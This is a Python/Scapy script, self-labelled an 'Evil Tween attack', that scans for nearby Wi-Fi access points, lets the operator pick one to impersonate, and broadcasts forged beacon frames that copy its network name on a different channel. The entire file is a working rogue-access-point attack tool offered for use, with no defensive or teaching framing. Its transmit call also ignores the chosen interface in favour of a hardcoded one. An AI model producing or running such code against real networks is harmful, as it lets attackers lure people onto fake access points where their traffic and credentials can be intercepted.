from scapy.all import *
import requests, time, threading, sys, netifaces, argparse

parser = argparse.ArgumentParser(prog="Scapy Fake channel Evil Tween attack",
                                 usage="%(prog)s -i mon0",
                                 allow_abbrev=False)

parser.add_argument("-i", "--Interface", required=True,
                    help="The interface that you want to send packets out of, needs to be set to monitor mode")
parser.add_argument("-b", "--BSSID", required=False, help="The BSSID of the Wireless Access Point you want people to connect to (Will default to interface's mac if not specified)", default="")


args = parser.parse_args()


# We sniff all Dot11 beacon packets, and store associated data
def packetHandler(p):
    if p.haslayer(Dot11Beacon) and p.addr3 not in BSSID:
        BSSID.append(str(p.addr3))
        BSSIDToPacket[str(p.addr3)] = p
        displayAP(str(p.addr3))
        


def displayAP(bssid):
    p = BSSIDToPacket[bssid]
    print("%03d) %s %s %d %-32s" % (BSSID.index(bssid), p.addr3, p.dBm_AntSignal, int(ord(p[Dot11Elt:3].info)), p.info.decode("utf-8") ))
    print("Press CTRL+C to stop scanning, and select target",end = "\r")

def stopfilter(x):
    return StopCond

BSSID = []
BSSIDToPacket = {}


print("id) <Mac address> <Signal strength, lower is better> <Channel Number> <SSID>")



# Use a separate thread to sniff, so we can stop it
e = threading.Event()

def _sniff(e):
    a = sniff(iface=args.Interface, prn=packetHandler, stop_filter=lambda p: e.is_set())


t = threading.Thread(target=_sniff, args=(e,))
t.start()

try:
    while True:
        time.sleep(1)
except (KeyboardInterrupt, SystemExit):
    e.set()

    while t.is_alive():
        t.join(2)

BSSID_Index = -1
while 0 > BSSID_Index or len(BSSID) - 1 < BSSID_Index:
    try:
        BSSID_Index = int(input("\nPlease Select the number associated with the network you wish to impersonate [0-%d] : " % (len(BSSID) - 1)))
    except ValueError:
        print("That wasn't an integer :(")


interface = netifaces.ifaddresses(args.Interface)[netifaces.AF_LINK]

dot11 = Dot11(type=0, subtype=8, addr1=interface[0]['broadcast'], addr2=interface[0]['addr'], addr3=interface[0]['addr'] if not args.BSSID else args.BSSID)

beacon = Dot11Beacon(cap='ESS+privacy')

essid = Dot11Elt(ID='SSID',info=BSSIDToPacket[BSSID[BSSID_Index]].info, len=len(BSSIDToPacket[BSSID[BSSID_Index]].info))

chn = int(ord(BSSIDToPacket[BSSID[BSSID_Index]][Dot11Elt:3].info))

chn = chn - 6 if chn > 6 else chn + 6


channel = Dot11Elt(ID='DSset', info=chr(chn))

frame = RadioTap()/dot11/beacon/essid/channel

frame.show()

answer = sendp(frame, iface="wlan0mon", inter=0.100, loop=1)
